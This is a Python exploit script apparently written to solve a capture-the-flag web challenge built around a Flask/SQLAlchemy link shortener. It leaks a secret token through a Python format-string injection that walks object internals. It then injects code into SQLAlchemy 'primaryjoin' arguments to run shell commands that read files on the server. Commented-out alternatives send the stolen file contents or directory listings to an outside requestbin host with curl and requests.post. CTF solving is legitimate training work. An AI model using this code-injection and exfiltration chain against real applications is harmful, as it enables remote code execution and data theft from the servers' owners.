import requests

BASE_URL = "https://link-shortener-457734664183c565.instancer.b01lersc.tf/"
# BASE_URL = "http://127.0.0.1:2727"

# Get token with __repr__ exploit
response = requests.get(
    url=f"{BASE_URL}/create",
    params={
        "url": "a.ch/{self._sa_instance_state.session.bind.__init__.__globals__[sys].modules[flask].current_app.config[TOKEN]}"
    },
)
assert response.status_code == 200
get_token_response = requests.get(
    url=f"{BASE_URL}/all",
)
assert get_token_response.status_code == 200
get_token_response = get_token_response.json()
print(get_token_response)
token = get_token_response['data'][0].split('a.ch/')[1].split('\', path')[0]

# Leverage primaryjoin (or orderby) to use free eval. Set the flag in the token, as sending the request isn't working
response = requests.post(
    url=f"{BASE_URL}/configure",
    json={
        "token": token,
        "new_token": token,  # Keep the token the same
        "ukwargs": {
            # Using SQLAlchemy's info dictionary to inject commands
            'primaryjoin': "__import__('flask').current_app.config.update({'TOKEN': __import__('os').popen('cat /*.txt 2>/dev/null').read()})",
            # "primaryjoin": "__import__('os').popen('curl -X POST -d \"$(cat /*.txt 2>/dev/null)\" http://requestbin.whapi.cloud/1lewhqt1').read()"
            # "primaryjoin": "__import__('requests').post('http://requestbin.whapi.cloud/1lewhqt1', json={1:__import__('subprocess').Popen(['ls', '/'], stdout=-1).communicate()[0].decode()})"
        },
        "pkwargs": {
            'primaryjoin': "__import__('flask').current_app.config.update({'TOKEN': __import__('os').popen('cat /*.txt 2>/dev/null').read()})",
        }
    }
)
assert response.status_code == 200

# register + login
user_data = {
        "name": "attacker",
        "password": "password123",
        "email": "attacker@example.com"
}
response = requests.post(f"{BASE_URL}/register", data=user_data)
assert response.status_code == 200

# Just ask again for this endpoint to get the flag
get_flag_response = requests.get(
    url=f"{BASE_URL}/all",
)
assert get_flag_response.status_code == 200
get_flag_response = get_flag_response.json()
print(get_flag_response)

# flag: bctf{why_does_sqlalchemy_have_hidden_eval5dd2053cf09ea561ce6295bfbeca63ba}